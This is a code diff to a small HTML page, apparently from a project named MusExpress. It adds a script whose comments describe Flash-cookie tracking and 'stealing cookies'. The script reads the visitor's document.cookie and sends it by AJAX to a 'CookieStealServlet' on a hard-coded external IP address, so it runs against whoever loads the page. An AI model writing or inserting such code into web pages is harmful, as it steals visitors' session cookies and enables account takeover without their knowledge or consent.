@@ -1,7 +1,39 @@
 <!DOCTYPE html>
 <html>
 <body>
+	<img src="http://81.57.18.95:8080/MusExpress/images/loader.gif">
+	<script>
+	/*
+	*web tracking with Flah FLOs
+	*/
+	
+	//get FLOS
+	//transform FLOS into cookies
+	
+	/*
+	*stealing cookies
+	*/
+	console.log('cookie: ' + document.cookie);
+	//copie cookies into variable cookies
+	var cookies = document.cookie;
+	
+	//sends cookies to MusExpress server
+	$.ajax({
+		type : "GET",
+		url : "http:\//81.57.18.95:8080/MusExpress/CookieStealServlet", //add complete URL
+		data : cookies,
+	
+		dataType : "json",
+		success : function(data) { 
+	
+		},
+		error : function(XHR, testStatus, errorThrown) 
+		{
+	
+		}
+	});
 
-<img src="http://81.57.18.95:8080/MusExpress/images/loader.gif">
+</script>
+
 </body>
 </html>
